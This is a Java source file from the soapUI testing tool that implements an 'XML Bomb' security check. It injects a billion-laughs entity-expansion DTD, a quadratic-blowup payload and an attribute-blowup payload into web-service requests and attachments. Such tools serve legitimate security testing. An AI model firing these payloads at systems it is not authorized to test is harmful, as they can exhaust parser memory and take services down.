/*
 *  soapUI, copyright (C) 2004-2011 eviware.com 
 *
 *  soapUI is free software; you can redistribute it and/or modify it under the 
 *  terms of version 2.1 of the GNU Lesser General Public License as published by 
 *  the Free Software Foundation.
 *
 *  soapUI is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without 
 *  even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. 
 *  See the GNU Lesser General Public License for more details at gnu.org.
 */

package com.eviware.soapui.security.check;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import com.eviware.soapui.SoapUI;
import com.eviware.soapui.config.RestParameterConfig;
import com.eviware.soapui.config.SecurityCheckConfig;
import com.eviware.soapui.config.StrategyTypeConfig;
import com.eviware.soapui.config.XmlBombSecurityCheckConfig;
import com.eviware.soapui.impl.support.AbstractHttpRequest;
import com.eviware.soapui.impl.wsdl.teststeps.WsdlTestRequestStep;
import com.eviware.soapui.model.ModelItem;
import com.eviware.soapui.model.iface.Attachment;
import com.eviware.soapui.model.security.SecurityCheckedParameter;
import com.eviware.soapui.model.testsuite.SamplerTestStep;
import com.eviware.soapui.model.testsuite.TestStep;
import com.eviware.soapui.security.SecurityTestRunContext;
import com.eviware.soapui.security.SecurityTestRunner;
import com.eviware.soapui.security.SecurityTestRunnerImpl;
import com.eviware.soapui.security.ui.SecurityCheckConfigPanel;
import com.eviware.soapui.security.ui.XmlBombSecurityCheckConfigPanel;
import com.eviware.soapui.support.xml.XmlUtils;

public class XmlBombSecurityCheck extends AbstractSecurityCheckWithProperties
{

	public static final String TYPE = "XmlBombSecurityCheck";

	private static final String DEFAULT_PREFIX = "xmlbomb";

	private int currentIndex = 0;

	public XmlBombSecurityCheck( SecurityCheckConfig config, ModelItem parent, String icon, TestStep testStep )
	{
		super( testStep, config, parent, icon );
		if( config.getConfig() == null )
		{
			XmlBombSecurityCheckConfig xmlbsc = XmlBombSecurityCheckConfig.Factory.newInstance();
			config.setConfig( xmlbsc );
		}
		if( getAttachmentPrefix() == null )
			setAttachmentPrefix( DEFAULT_PREFIX );

		if( getBombList().size() < 1 )
		{
			getBombList()
					.add(
							"<!DOCTYPE lolz [\n<!ENTITY lol \"lol\">\n<!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n<!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n<!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\n<!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\">\n<!ENTITY lol6 \"&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;\">\n<!ENTITY lol7 \"&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;\">\n<!ENTITY lol8 \"&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;\">\n<!ENTITY payload \"&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;\">\n]>" );
		}
	}

	// QUESTION:
	/*
	 * How this works??
	 */
	// @Override
	// public void analyze( TestStep testStep, SecurityTestRunContext context )
	// {
	// AbstractHttpRequest<?> lastRequest = getRequest( testStep );
	//
	// if( lastRequest.getResponse().getContentAsString().indexOf( "SQL Error" )
	// > -1 )
	// {
	// // securityTestLog.addEntry( new SecurityTestLogMessageEntry(
	// // "SQL Error displayed in response", null
	// // new HttpResponseMessageExchange(lastRequest) ) );
	// securityCheckRequestResult.setStatus( SecurityCheckStatus.FAILED );
	// }
	// else
	// {
	// securityCheckRequestResult.setStatus( SecurityCheckStatus.OK );
	// }
	// // TODO
	// }

	@Override
	protected void execute( SecurityTestRunner securityTestRunner, TestStep testStep, SecurityTestRunContext context )
	{
		currentIndex = 0;

		String originalResponse = getOriginalResult( ( SecurityTestRunnerImpl )securityTestRunner, testStep )
				.getResponse().getContentAsXml();
		String originalRequest = getRequest( testStep ).getRequestContent();
		if( isAttachXmlBomb() )
		{
			while( currentIndex < getBombList().size() + 1 )
			{
				Attachment attach = attachXmlBomb( testStep );
				// runCheck(testStep, context, securityTestLog, testCaseRunner,
				// originalResponse,
				// "Possible XML Bomb Vulnerability Detected");
				( ( AbstractHttpRequest<?> )getRequest( testStep ) ).removeAttachment( attach );
				( ( AbstractHttpRequest<?> )getRequest( testStep ) ).setRequestContent( originalRequest );
			}

			currentIndex = 0;
		}

		if( getExecutionStrategy().getStrategy() == StrategyTypeConfig.ONE_BY_ONE
				&& getParameterHolder().getParameterList().size() > 0 )
		{
			for( SecurityCheckedParameter param : getParameterHolder().getParameterList() )
			{
				if( param != null )
				{
					while( currentIndex < getBombList().size() + 1 )
					{
						generateNextRequest( testStep, param.getName() );
						// runCheck(testStep, context, securityTestLog,
						// testCaseRunner, originalResponse,
						// "Possible XML Bomb Vulnerability Detected");
						( ( AbstractHttpRequest<?> )getRequest( testStep ) ).setRequestContent( originalRequest );
					}
				}
			}
		}
		else if( getParameterHolder().getParameterList().size() > 0 )
		{
			while( currentIndex < getBombList().size() + 1 )
			{
				generateNextRequest( testStep, getParameterHolder().getParameterList() );
				// runCheck( testStep, context, securityTestLog, testCaseRunner,
				// originalResponse,
				// "Possible XML Bomb Vulnerability Detected" );
				( ( AbstractHttpRequest<?> )getRequest( testStep ) ).setRequestContent( originalRequest );
			}
		}
		// TODO

	}

	private TestStep generateNextRequest( TestStep testStep, List<SecurityCheckedParameter> list )
	{
		AbstractHttpRequest<?> request = ( AbstractHttpRequest<?> )getRequest( testStep );
		if( currentIndex < getBombList().size() )
		{
			String bomb = getBombList().get( currentIndex );

			String requestContent = request.getRequestContent();
			String newRequestContent = requestContent;
			if( testStep instanceof WsdlTestRequestStep )
			{
				for( SecurityCheckedParameter param : list )
				{
					newRequestContent = XmlUtils.setXPathContent( newRequestContent, param.getName().substring(
							param.getName().lastIndexOf( "\n" ) + 1 ), "&&payload&&" );
				}
				newRequestContent = newRequestContent.replaceAll( "&amp;&amp;payload&amp;&amp;", "&payload" );
			}

			newRequestContent = bomb + newRequestContent;

			request.setRequestContent( newRequestContent );

			currentIndex++ ;
		}
		else if( currentIndex == getBombList().size() )
		{
			request.setRequestContent( createQuadraticExpansionAttack( request.getRequestContent(), list ) );
		}

		return testStep;

	}

	@Override
	public boolean acceptsTestStep( TestStep testStep )
	{
		return testStep instanceof SamplerTestStep;
	}

	@Override
	public SecurityCheckConfigPanel getComponent()
	{
		return new XmlBombSecurityCheckConfigPanel( this );
	}

	@Override
	public String getType()
	{
		return TYPE;
	}

	public boolean isAttachXmlBomb()
	{
		return ( ( XmlBombSecurityCheckConfig )getConfig().getConfig() ).getAttachXmlBomb();
	}

	public void setAttachXmlBomb( boolean attach )
	{
		( ( XmlBombSecurityCheckConfig )getConfig().getConfig() ).setAttachXmlBomb( attach );
	}

	private TestStep generateNextRequest( TestStep testStep, String param )
	{
		AbstractHttpRequest<?> request = ( AbstractHttpRequest<?> )getRequest( testStep );

		if( currentIndex < getBombList().size() )
		{
			String bomb = getBombList().get( currentIndex );

			String requestContent = request.getRequestContent();
			String newRequestContent = requestContent;
			if( testStep instanceof WsdlTestRequestStep )
			{
				newRequestContent = XmlUtils.setXPathContent( request.getRequestContent(), param.substring( param
						.lastIndexOf( "\n" ) + 1 ), "&&payload&&" );
				// We need to do this, since the parser we are using does not
				// provide support for
				// entity references (it throws a "Not Implemented" runtime
				// exception when trying to create one
				newRequestContent = newRequestContent.replaceAll( "&amp;&amp;payload&amp;&amp;", "&payload;" );
			}

			newRequestContent = bomb + newRequestContent;
			// This is a bit of a hack, since the xpath functionality above
			// strips the DTD if it is run
			// after the DTD is added.
			request.setRequestContent( newRequestContent );

		}
		else if( currentIndex == getBombList().size() )
		{
			List<RestParameterConfig> paramList = new ArrayList<RestParameterConfig>();
			RestParameterConfig restParam = RestParameterConfig.Factory.newInstance();
			restParam.setName( param );
			paramList.add( restParam );
			// request.setRequestContent( createQuadraticExpansionAttack(
			// request.getRequestContent(), paramList ) );
		}

		currentIndex++ ;

		return testStep;
	}

	private Attachment attachXmlBomb( TestStep testStep )
	{
		Attachment attach = null;
		if( isAttachXmlBomb() )
		{
			AbstractHttpRequest<?> request = ( AbstractHttpRequest<?> )getRequest( testStep );

			if( currentIndex < getBombList().size() )
			{
				String bomb = getBombList().get( currentIndex );
				try
				{
					File bombFile = File.createTempFile( getAttachmentPrefix(), ".xml" );
					BufferedWriter writer = new BufferedWriter( new FileWriter( bombFile ) );
					writer.write( bomb );
					writer.write( "<payload>&payload;</payload>" );
					writer.flush();
					attach = request.attachFile( bombFile, false );
					bombFile.delete();
					currentIndex++ ;
				}
				catch( IOException e )
				{
					SoapUI.logError( e );
				}
			}
			else if( currentIndex == getBombList().size() )
			{
				try
				{
					File bombFile = File.createTempFile( getAttachmentPrefix(), ".xml" );
					BufferedWriter writer = new BufferedWriter( new FileWriter( bombFile ) );
					writer.write( createQuadraticExpansionAttack( null, null ) );
					writer.flush();
					attach = request.attachFile( bombFile, false );
					bombFile.delete();
				}
				catch( IOException e )
				{
					SoapUI.logError( e );
				}
				currentIndex++ ;
			}
		}
		return attach;
	}

	protected List<String> getBombList()
	{
		return ( ( XmlBombSecurityCheckConfig )getConfig().getConfig() ).getXmlBombsList();
	}

	protected void setBombList( List<String> bombList )
	{
		( ( XmlBombSecurityCheckConfig )getConfig().getConfig() ).setXmlBombsArray( bombList.toArray( new String[1] ) );
	}

	protected List<String> getExternalDTDList()
	{
		return ( ( XmlBombSecurityCheckConfig )getConfig().getConfig() ).getExternalDTDList();
	}

	protected void setExternalDTDList( List<String> dtdList )
	{
		( ( XmlBombSecurityCheckConfig )getConfig().getConfig() ).setExternalDTDArray( dtdList.toArray( new String[1] ) );
	}

	public String getAttachmentPrefix()
	{
		return ( ( XmlBombSecurityCheckConfig )getConfig().getConfig() ).getXmlAttachmentPrefix();
	}

	public void setAttachmentPrefix( String prefix )
	{
		( ( XmlBombSecurityCheckConfig )getConfig().getConfig() ).setXmlAttachmentPrefix( prefix );
	}

	private String createQuadraticExpansionAttack( String initialContent, List<SecurityCheckedParameter> list )
	{
		String result = "";

		StringBuilder entityContent = new StringBuilder( "a" );
		StringBuilder entityReferences = new StringBuilder( "&a;" );

		if( initialContent != null )
		{
			for( SecurityCheckedParameter param : list )
			{
				initialContent = XmlUtils.setXPathContent( initialContent, param.getName().substring(
						param.getName().lastIndexOf( "\n" ) + 1 ), "&&payload&&" );
			}
			for( int i = 0; i < 16; i++ )
			{
				entityContent.append( entityContent.toString() );
				entityReferences.append( entityReferences.toString() );
			}
			initialContent = initialContent.replaceAll( "&amp;&amp;payload&amp;&amp;", entityReferences.toString() );
		}
		else
		{
			for( int i = 0; i < 16; i++ )
			{
				entityContent.append( entityContent.toString() );
				entityReferences.append( entityReferences.toString() );
			}
			initialContent = "<kaboom>" + entityReferences + "</kaboom>";
		}

		result = "<!DOCTYPE kaboom [\n<!ENTITY a \"" + entityContent.toString() + "\">\n]>" + initialContent;

		return result;
	}

	private String createAttributeBlowupAttack( String initialContent, List<String> params )
	{
		String result = "";

		result = "<kaboom ";

		for( int i = 0; i < 200000; i++ )
		{
			result = result + " att" + i + "='test' ";
		}

		result += "/>";

		return result;
	}

	@Override
	protected boolean hasNext(TestStep testStep,SecurityTestRunContext context)
	{
		// TODO Auto-generated method stub
		return false;
	}

	@Override
	public String getConfigDescription()
	{
		return "Configures Xml bomb security check";
	}

	@Override
	public String getConfigName()
	{
		return "XML Bomb Security Check";
	}

	@Override
	public String getHelpURL()
	{
		return "http://www.soapui.org";
	}
}
